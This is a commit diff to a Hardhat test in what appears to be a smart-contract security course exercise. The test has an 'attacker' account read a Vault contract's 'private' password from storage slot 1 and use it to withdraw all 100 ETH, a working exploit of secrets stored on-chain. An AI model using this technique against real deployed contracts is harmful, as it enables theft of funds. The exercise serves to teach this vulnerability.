91b3c42a778c347939395f408781aece39e38cf4
Zeeshan Meghji <zeeshan_meghji@hotmail.com>
2022-01-15 22:33:15 -0500

    completed module 3 (unencrypted data)

--- test-fill-the-blanks/visibility-test.js
+++ test-fill-the-blanks/visibility-test.js
@@ -3,20 +3,29 @@ const { ethers } = require("hardhat");
 
 describe("Vault", function () {
   let deployer, attacker;
-
+  let pwd = "myPassword"
   beforeEach(async function () {
     [deployer, attacker] = await ethers.getSigners();
 
     const Vault = await ethers.getContractFactory("Vault", deployer);
-    this.vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
-
+    this.vault = await Vault.deploy(ethers.utils.formatBytes32String(pwd));
+     
     await this.vault.deposit({ value: ethers.utils.parseEther("100") });
   });
 
   it("Should be possible to access to its private variables", async function () {
     const initialBalanceContract = await ethers.provider.getBalance(this.vault.address);
     const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);
+    
+    let retreivedPwd = await ethers.provider.getStorageAt(this.vault.address, 1);
+    expect(ethers.utils.parseBytes32String(retreivedPwd)).to.equal(pwd)
+    await this.vault.connect(attacker).withdraw(retreivedPwd);
 
-    //...
+    const finalBalanceContract = await ethers.provider.getBalance(this.vault.address);
+    const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);
+    
+    expect(finalBalanceContract).to.eq(0);
+    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
+
   });
 });
